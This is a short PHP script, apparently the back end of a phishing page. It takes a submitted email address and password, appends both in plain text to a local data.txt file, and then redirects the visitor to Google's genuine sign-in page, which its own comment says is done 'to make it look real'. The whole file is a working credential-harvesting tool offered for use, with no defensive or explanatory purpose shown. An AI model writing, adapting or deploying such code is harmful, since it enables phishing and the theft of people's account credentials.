<?php
$email=$_POST["email"];
$password=$_POST["password"];

// Format the data
$data = "Email: " . $email . " | Password: " . $password . "\n";

// Save to a text file
//First Create a file name data.txt or any name you want 
file_put_contents("data.txt", $data, FILE_APPEND | LOCK_EX);

// Redirect to Google (to make it look real)
header("Location: https://accounts.google.com/signin");
exit();

?>